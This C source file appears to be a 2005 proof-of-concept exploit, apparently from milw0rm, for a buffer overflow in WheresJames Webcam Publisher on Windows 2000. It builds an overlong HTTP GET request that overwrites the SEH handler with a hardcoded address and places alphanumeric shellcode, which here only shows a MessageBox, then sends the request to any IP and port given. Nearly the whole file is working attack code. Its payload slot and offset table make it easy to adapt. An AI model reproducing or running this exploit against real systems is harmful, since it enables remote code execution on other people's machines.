/*
 * WheresJames Webcam Publisher Beta 2.0.0014 POC (www.wheresjames.com)
 *
 *
 * Bug and Exploit by : Miguel Tarascó Acuña - Haxorcitos.com 2005
 *                      Tarako AT gmail.com - Tarako AT Haxorcitos.com
 *
 * Platforms tested:
 *
 *       - Windows 2000 SP4 Spanish
 *       - Probably All Windows 2000 versions
 *
 *
 * Exploit Date: 15/April/2005
 *
 *
 * THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED "AS IS"
 * AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION
 * WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.
 *
 * Greetings to: #haxorcitos, #dsr and #localhost @efnet
 *
 *
 * Little Explanation:
 *
 * Buffer must only have bytes between 0x20 and 0x7A, this limits you to use 
 *  a generic shellcode.
 * I created a harcoded MessageBoxA alphanumeric Shellcode to run with this POC
 * Also the offset referenced by the Call ECX SEH handler overwriten, must contain
 *  only bytes between 0x20 and 0x7A
 *
 * 77F69B9F   8B4D 18          MOV ECX,DWORD PTR SS:[EBP+18]
 * 77F69BA2   FFD1             CALL ECX   
 *
 *  stack
 * 00000000
 * 00000000
 * XXXXXXXX  <-- EBX points to HERE (XX >= 0x20 && XX <= 0x7A)
 * YYYYYYYY  <-- This DWORD overwrites the SEH handler (the flow is taken in the CALL ECX)
 * 00000000
 * 00000000
 *
 */

#include <winsock2.h>
#include <stdio.h>

#pragma comment (lib,"ws2_32")

#define TIMEOUT 1
#define TOPHEADER "GET "
#define MIDDLEHEADER "\nHost: "
#define BOTTOMHEADER "\nUser-Agent: User-Agent: Haxorcitos/1.0 (compatible; MSIE 6.0; Windows NT 5.0)\n\
Accept: */*\n\
Accept-Language: es\n\
Accept-Encoding: gzip,deflate\n\
Keep-Alive: 100\n\
Connection: keep-alive\r\n\r\n"
#define BUFFERLEN 5000


char shellcode[] = // little harcoded alphanumeric "shellcode"
// haaaaX5aaaaP[H-,F3T--F3U5!@z!ShkitohTaraTZSSRSSPÃ
	"\x68\x61\x61\x61\x61" // PUSH 61616161     ;
	"\x58"                 // POP  EAX          ; EAX = 61616161 
	"\x35\x61\x61\x61\x61" // XOR  EAX,61616161 ; EAX = 00000000
	"\x50"                 // PUSH EAX          ;
	"\x5B"                 // POP  EBX          ; EBX = 00000000
	"\x48"                 // DEC  EAX          ; EAX = FFFFFFFF
	"\x2D\x2C\x46\x33\x54" // SUB  EAX,5433462C ; EAX = ABCCB9D3
	"\x2D\x2D\x46\x33\x55" // SUB  EAX,5533462D ; EAX = 569973A6
	"\x35\x21\x40\x7A\x21" // XOR  EAX,217A4021 ; EAX = 77E33387 USER32.MessageBoxA (Win2kSP4)
	"\x53"                 // PUSH EBX          ;
	"\x68\x6B\x69\x74\x6F" // PUSH 6F74696B     ; ASCII "kito"
	"\x68\x54\x61\x72\x61" // PUSH 61726154     ; ASCII "Tara"
	"\x54"                 // PUSH ESP          ;
	"\x5A"                 // POP  EDX          ; ASCII "Tarakito"
	"\x53"                 // PUSH EBX          ; 0
	"\x53"                 // PUSH EBX          ; 0
	"\x52"                 // PUSH EDX          ; Tarakito
	"\x53"                 // PUSH EBX          ; 0
	"\x53"                 // PUSH EBX          ; 0
	"\x50"                 // PUSH EAX          ; MessageBoxA
	"\xC3";                // RETN


struct  { char *name;  long offset; } supported[] = { 
   // 0x72712F5E (clbcatq.dll 2000.2.3511.0) ->  83C108 = ADD ECX,8  +  FFD1 = CALL ECX
   {"Windows 2000 Pro SP4 Spanish", 0x72712F5E }, 
   {"Crash", 0x41414141 }
},VERSIONES;


/******************************************************************************/
void ShowHeader(int argc,char *argv[]) {
   int i;
   printf("\n WheresJames Webcam Publisher Beta 2.0.0014 Buffer Overflow POC\n");
   printf(" Exploit by Miguel Tarasco - Tarako [at] gmail [dot] com\n");
	
   printf("\n Windows Versions:\n");
   printf(" ---------------------------------------------\n");
   for (i=0;i<sizeof(supported)/sizeof(VERSIONES);i++) {
      printf("  %d) %s (0x%08x)\n",i,supported[i].name,supported[i].offset);
   }
   printf(" ---------------------------------------------\n\n");
   if (argc<4) {      
      printf(" Usage: %s <IP> <Port> <Option>\n",argv[0]);
      exit(1);
      exit(1);
   }
}
/******************************************************************************/

void main(int argc, char *argv[]) {
   SOCKET s;
   
   WSADATA HWSAdata;
   struct  sockaddr_in sa;

   char *buffer=NULL;

   ShowHeader(argc,argv);

   if (WSAStartup(MAKEWORD(2,2), &HWSAdata) != 0) { 
      printf("\n [e] Error: WSAStartup():%d\n", WSAGetLastError()); 
      exit(1); 
   }

   if ((s=WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP,0,0,0))==INVALID_SOCKET){ 
      printf("\n [e] Error: socket():%d\n", WSAGetLastError()); 
      exit(1); 
   }

   sa.sin_family           = AF_INET;
   sa.sin_port             = (USHORT)htons(atoi(argv[2]));
   sa.sin_addr.S_un.S_addr = inet_addr(argv[1]);

   if ( connect(s, (struct sockaddr *) &sa, sizeof(sa)) == SOCKET_ERROR ) { 
      printf("\n [e] Error: connect()"); 
      exit(1); 
   }

   printf(" [i] Connected : Yes\n");
   printf(" [i] Target    : %s\n",supported[atoi(argv[3])].name);

   buffer=(char*)malloc(strlen(TOPHEADER)+BUFFERLEN+strlen(MIDDLEHEADER)+strlen(argv[1])+1+strlen(argv[2])+strlen(BOTTOMHEADER)+1); 
   memset(buffer,0,sizeof(buffer));

   memcpy(buffer,TOPHEADER,strlen(TOPHEADER));

   memset(buffer+strlen(TOPHEADER),'A',BUFFERLEN);

   memcpy(buffer+strlen(TOPHEADER)+1052,&supported[atoi(argv[3])].offset,sizeof(long));

   memcpy(buffer+strlen(TOPHEADER)+1060,shellcode,strlen(shellcode));

   memcpy(buffer+BUFFERLEN,MIDDLEHEADER,strlen(MIDDLEHEADER));
   memcpy(buffer+BUFFERLEN+strlen(MIDDLEHEADER),argv[1],strlen(argv[1]));
   memcpy(buffer+BUFFERLEN+strlen(MIDDLEHEADER)+strlen(argv[1]),":",strlen(":"));
   memcpy(buffer+BUFFERLEN+strlen(MIDDLEHEADER)+strlen(argv[1])+strlen(":"),argv[2],strlen(argv[2]));
   memcpy(buffer+BUFFERLEN+strlen(MIDDLEHEADER)+strlen(argv[1])+strlen(":")+strlen(argv[2]),BOTTOMHEADER,strlen(BOTTOMHEADER));

   send(s,buffer,strlen(buffer),0);

   printf(" [i] Buffer sent\n\n");

   closesocket(s);

}

// milw0rm.com [2005-04-18]
